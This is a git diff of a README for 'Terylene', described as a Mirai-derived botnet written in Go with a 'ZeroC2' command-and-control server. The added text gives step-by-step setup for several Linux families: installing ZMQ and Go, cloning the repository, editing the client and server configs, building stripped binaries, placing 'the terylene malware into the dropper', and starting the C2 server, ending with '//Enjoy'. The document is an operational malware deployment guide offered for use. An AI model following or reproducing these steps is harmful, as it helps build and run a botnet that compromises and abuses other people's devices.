@@ -34,15 +34,99 @@ Terylene is a modified version of the previous mirai botnet using golang instead
 
 
 
-# Ubuntu Setup
+# Debian based Setup
+// Ubuntu , Debian , Kali, Parrot OS
 
 ## Install ZMQ package using APT
 ```
-sudo apt-get update
+sudo apt update
+sudo apt upgrade
 sudo apt-get install libzmq3-dev
 ```
+# Install golang (if you havent)
+```
+apt-get install golang-go
+```
 
-## Clone the repo 
+# Arch based setup
+// Arch , BlackArch
+
+## Install ZMQ package using pacman
 
 ```
+sudo pacman -Sy
+sudo pacman -S zeromq
+```
+
+## Install golang using pacman(if you havent)
+```
+sudo pacman -S go
+```
+
+
+# Red Hat based setup
+
+## Install ZMQ package using yum
+
+```
+sudo yum update
+sudo dnf makecache --refresh
+sudo yum install zeromq
+```
+
+# Install Golang using yum (if you havent)
+
+```
+yum install golang
+```
+
+
+
+# ZeroC2 and terylene setup
+
+## Clone the repo
+```
+git clone https://github.com/polymaster3313/terylene.git
+```
+
+## setup the dependencies
+```
+cd terylene
+go mod init terylene
+go mod tidy
+```
+
+# edit the configs in client.go and server.go respectively
+
+```
+cd client
+nano client.go
+cd ..
+cd server
+nano server.go
+cd ..
+```
+
+# build terylene and ZeroC2
+
+```
+cd server
+go build -ldflags="-s -w" server.go
+cd ..
+cd client
+go build -ldflags="-s -w" terylene.go
+```
+
+# drop the terylene malware into the dropper
+
+```
+mv terylene <path to the server dropper folder
+```
+
+# start the zeroC2
+
+```
+./server
+```
+//Enjoy
 
